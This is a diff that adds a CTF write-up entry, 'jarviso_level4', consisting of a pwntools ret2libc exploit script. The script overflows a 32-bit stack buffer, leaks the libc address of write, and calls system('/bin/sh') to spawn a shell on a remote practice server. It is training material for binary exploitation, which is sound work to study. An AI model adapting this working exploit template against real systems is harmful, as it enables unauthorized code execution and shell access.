@@ -840,3 +840,39 @@ r.sendline(p)
 r.interactive()
 ```
 
+## 40 jarviso_level4
+
+***ret2libc***
+
+```python
+from pwn import *
+from LibcSearcher import *
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',28452)
+def dbg():
+    gdb.attach(p)
+    pause()
+
+main = elf.sym['main']
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+
+payload = b'a'*0x88+b'b'*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)
+p.sendline(payload)
+write_addr = u32(p.recv(4))
+libc = LibcSearcher('write',write_addr)
+libc_base = write_addr-libc.dump('write')
+log.info('libc_base:'+hex(libc_base))
+
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+payload = b'a'*0x88+b'b'*0x4+p32(sys)+p32(0)+p32(binsh)
+p.sendline(payload)
+p.interactive()
+```
+
